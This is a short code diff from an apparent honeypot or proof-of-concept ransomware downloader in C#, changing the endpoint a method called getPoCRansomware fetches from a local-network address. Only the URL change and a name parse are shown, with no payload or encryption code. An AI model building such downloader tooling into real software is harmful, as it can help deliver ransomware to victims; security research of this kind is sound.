@@ -18,7 +18,7 @@ namespace HoneyPot2POCRansomwareDownloader
         public static void getPoCRansomware()
         {
 
-            var responseString = client.GetStringAsync("http://192.168.8.102/v1/index.php/gethp2ransomware").Result;
+            var responseString = client.GetStringAsync("http://192.168.8.102/v1/index.php/gethp2host").Result;
             NAMEONTEST = findNAMEONTEST(responseString);
             Console.WriteLine(NAMEONTEST);
 
